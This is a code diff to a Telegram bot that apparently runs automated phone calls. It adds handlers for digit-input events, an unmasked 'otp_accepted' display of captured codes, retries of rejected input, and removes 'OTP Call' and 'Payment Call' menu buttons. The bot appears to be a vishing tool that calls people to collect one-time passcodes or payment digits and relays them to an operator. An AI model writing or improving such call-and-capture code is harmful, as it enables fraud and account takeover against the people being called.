@@ -168,6 +168,48 @@ function formatCallEvent(event) {
         return message;
     }
 
+    if (type === 'call_input_waiting') {
+        const label = payload.label || 'Input';
+        const len = payload.expected_length ? ` (${payload.expected_length} digits)` : '';
+        message.text = `⌨️ Awaiting input: ${label}${len}`;
+        return message;
+    }
+
+    if (type === 'call_input_success') {
+        const label = payload.label || 'Input';
+        const len = payload.length ? ` (len=${payload.length})` : '';
+        message.text = `✅ Input received: ${label}${len}`;
+        return message;
+    }
+
+    if (type === 'call_input_retry') {
+        const attemptInfo =
+            payload.attempts && payload.max_attempts
+                ? ` (Attempt ${payload.attempts}/${payload.max_attempts})`
+                : '';
+        message.text = `❌ Rejected.${attemptInfo}\n🔁 Re-prompting for input…`;
+        return message;
+    }
+
+    if (type === 'call_input_failed') {
+        const attemptInfo =
+            payload.attempts && payload.max_attempts
+                ? ` (Attempt ${payload.attempts}/${payload.max_attempts})`
+                : '';
+        message.text = `❌ Input failed.${attemptInfo}`;
+        return message;
+    }
+
+    if (type === 'call_final_outcome') {
+        const success = Boolean(payload.success);
+        const reason = payload.reason || payload.finalStatus || 'unknown';
+        message.text = success
+            ? '✅ Completed successfully.'
+            : `❌ Not completed: ${reason}.`;
+        message.replyMarkup = buildInlineKeyboard(callSid);
+        return message;
+    }
+
     if (type === 'otp_accepted') {
         const codePreview = payload.code || maskDigitsPreview(payload.code);
         const len = payload.length || (codePreview ? String(codePreview).replace(/•/g, '').length : null);
@@ -242,6 +284,24 @@ bot.catch((err) => {
 });
 
 // Poll and post pending webhook notifications as styled call feeds
+const lastSentByCall = new Map();
+const lastSentAtByCall = new Map();
+
+async function sendHeaderIfMissing(notif, payload) {
+    const existingThread = await getCallThread(notif.call_sid);
+    if (existingThread && existingThread.telegram_chat_id === notif.telegram_chat_id) {
+        return existingThread.message_id;
+    }
+    const headerText = buildHeaderMessage(payload || {}, notif.call_sid);
+    const sent = await bot.api.sendMessage(notif.telegram_chat_id, headerText, {
+        parse_mode: 'HTML',
+        protect_content: true,
+        reply_markup: buildInlineKeyboard(notif.call_sid)
+    });
+    await upsertCallThread(notif.call_sid, notif.telegram_chat_id, sent.message_id);
+    return sent.message_id;
+}
+
 async function processPendingNotifications() {
     try {
         const pending = await fetchPendingNotifications(20);
@@ -253,6 +313,13 @@ async function processPendingNotifications() {
                 continue;
             }
             try {
+                const now = Date.now();
+                const lastType = lastSentByCall.get(notif.call_sid);
+                const lastTs = lastSentAtByCall.get(notif.call_sid) || 0;
+                if (lastType === notif.notification_type && now - lastTs < 500) {
+                    await markNotification(notif.id, 'sent', null, 'debounced');
+                    continue;
+                }
                 const existingThread = await getCallThread(notif.call_sid);
                 let messageId = null;
                 const sendOptions = {
@@ -268,11 +335,19 @@ async function processPendingNotifications() {
                     });
                     messageId = existingThread.message_id;
                 } else {
-                    const sent = await bot.api.sendMessage(notif.telegram_chat_id, text, sendOptions);
-                    messageId = sent.message_id;
-                    await upsertCallThread(notif.call_sid, notif.telegram_chat_id, sent.message_id);
+                    const payload = parsePayload(notif.payload);
+                    const headerId = await sendHeaderIfMissing(notif, payload);
+                    const sent = await bot.api.sendMessage(notif.telegram_chat_id, text, {
+                        ...sendOptions,
+                        reply_to_message_id: headerId,
+                        allow_sending_without_reply: true
+                    });
+                    messageId = headerId;
+                    await upsertCallThread(notif.call_sid, notif.telegram_chat_id, headerId);
                 }
                 await markNotification(notif.id, 'sent', messageId, null);
+                lastSentByCall.set(notif.call_sid, notif.notification_type);
+                lastSentAtByCall.set(notif.call_sid, now);
             } catch (error) {
                 console.error('Failed to send notification', notif.id, error.message);
                 await markNotification(notif.id, 'failed', null, error.message);
@@ -683,8 +758,6 @@ bot.command('start', async (ctx) => {
 
         // Add buttons
         kb.text('📞 Call', 'CALL')
-          .text('🔐 OTP', 'OTP')
-          .text('💳 Pay', 'PAYMENT')
           .text('📚 Guide', 'GUIDE')
             .row()
             .text('💬 SMS', 'SMS')
@@ -797,8 +870,6 @@ bot.on('callback_query:data', async (ctx, next) => {
         // Handle conversation actions
         const conversations = {
             'CALL': 'call-wizard',
-            'OTP': 'call-wizard',
-            'PAYMENT': 'call-wizard',
             'ADDUSER': 'adduser-conversation',
             'PROMOTE': 'promote-conversation',
             'REMOVE': 'remove-conversation',
@@ -969,8 +1040,6 @@ async function executeHelpCommand(ctx) {
         
         const kb = new InlineKeyboard()
         .text('📞 New Call', 'CALL')
-        .text('🔐 OTP Call', 'OTP')
-        .text('💳 Payment Call', 'PAYMENT')
         .text('📋 Menu', 'MENU')
         .row()
         .text('📱 New SMS', 'SMS')
@@ -1068,8 +1137,6 @@ Version: 2.0.0`;
 
     const kb = new InlineKeyboard()
         .text('📞 Call', 'CALL')
-        .text('🔐 OTP', 'OTP')
-        .text('💳 Pay', 'PAYMENT')
         .text('📋 Commands', 'HELP')
         .row()
         .text('🔄 Main Menu', 'MENU')
@@ -1084,8 +1151,6 @@ Version: 2.0.0`;
 async function executeMenuCommand(ctx, isAdminUser) {
     const kb = new InlineKeyboard()
         .text('📞 Call', 'CALL')
-        .text('🔐 OTP', 'OTP')
-        .text('💳 Pay', 'PAYMENT')
         .text('💬 SMS', 'SMS')
         .row()
         .text('📋 Calls', 'CALLS')
